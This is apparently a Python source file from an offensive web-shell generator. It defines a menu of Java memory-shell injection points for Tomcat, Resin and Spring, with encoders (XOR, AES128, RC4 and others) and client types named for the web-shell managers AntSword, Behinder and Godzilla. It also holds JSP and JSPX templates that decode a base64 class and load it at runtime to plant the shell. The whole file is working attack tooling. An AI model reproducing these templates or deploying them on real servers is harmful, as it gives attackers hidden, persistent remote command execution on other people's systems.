MENU = {
    "Java": {
        "Tomcat": {
            # "Executor": {},
            "Valve": {
                "RAW": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
                "Base64": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
                "XOR": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                    "Behinder": {"PassWord": {}},
                },
                "AES128": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                    "Behinder": {"PassWord": {}},
                    "Godzilla": {"PassWord": {}},
                },
                "RC4": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
            },
            "Listener": {
                "RAW": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
                "Base64": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
                "XOR": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                    "Behinder": {"PassWord": {}},
                },
                "AES128": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                    "Behinder": {"PassWord": {}},
                    "Godzilla": {"PassWord": {}},
                },
                "RC4": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
            },
            # "Filter": {},
            "WsFilter": {
                "RAW": {
                    "CMD": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
                "Base64": {
                    "CMD": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
                "XOR": {
                    "CMD": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
                "AES128": {
                    "CMD": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
                "RC4": {
                    "CMD": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
            },
            "Servlet": {
                "RAW": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
                "Base64": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
                "XOR": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                    "Behinder": {"PassWord": {}},
                },
                "AES128": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                    "Behinder": {"PassWord": {}},
                    "Godzilla": {"PassWord": {}},
                },
                "RC4": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
            },
        },
        "Resin": {
            "Listener": {
                "RAW": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
                "Base64": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
                "XOR": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                    "Behinder": {"PassWord": {}},
                },
                "AES128": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                    "Behinder": {"PassWord": {}},
                    "Godzilla": {"PassWord": {}},
                },
                "RC4": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
            },
        },
        "Spring": {
            "Interceptor": {
                "RAW": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
                "Base64": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
                "XOR": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                    "Behinder": {"PassWord": {}},
                },
                "AES128": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                    "Behinder": {"PassWord": {}},
                    "Godzilla": {"PassWord": {}},
                },
                "RC4": {
                    "CMD": {"PassWord": {}},
                    "AntSword": {"PassWord": {}},
                    "JSPJS": {"PassWord": {}},
                },
            },
        },
    }
}

ARCH = {
    1: "language",
    2: "container",
    3: "model",
    4: "decoder",
    5: "stub",
    6: "password",
    7: "key",
}

JSP = """
<%!
    class U extends ClassLoader {{
        U(ClassLoader c) {{
            super(c);
        }}
        public Class g(byte[] b) {{
            return super.defineClass(b, 0, b.length);
        }}
    }}

    public byte[] base64Decode(String str) throws Exception {{
        Class base64;
        byte[] value = null;
        try {{
            base64=Class.forName("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {{String.class}}).invoke(decoder, new Object[] {{str}});
        }} catch (Exception e) {{
            try {{
                base64=Class.forName("java.util.Base64");
                Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
                value = (byte[])decoder.getClass().getMethod("decode", new Class[] {{String.class}}).invoke(decoder, new Object[] {{str}});
            }} catch (Exception ee) {{}}
        }}
        return value;
    }}
%>
<%
    String cls = "{clazz}";
    if (cls != null) {{
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance();
    }}
%>
"""

JSPX = """
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
    <jsp:declaration>
        class U extends ClassLoader {{
            U(ClassLoader c) {{
                super(c);
            }}
            public Class g(byte[] b) {{
                return super.defineClass(b, 0, b.length);
            }}
        }}
        public byte[] base64Decode(String str) throws Exception {{
            Class base64;
            byte[] value = null;
            try {{
                base64=Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {{String.class }}).invoke(decoder, new Object[] {{ str }});
            }} catch (Exception e) {{
                try {{
                    base64=Class.forName("java.util.Base64");
                    Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
                    value = (byte[])decoder.getClass().getMethod("decode", new Class[] {{ String.class }}).invoke(decoder, new Object[] {{ str }});
                }} catch (Exception ee) {{}}
            }}
            return value;
        }}
    </jsp:declaration>
    <jsp:scriptlet>
        String cls = "{clazz}";
        if (cls != null) {{
            new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance();
        }}
    </jsp:scriptlet>
</jsp:root>
"""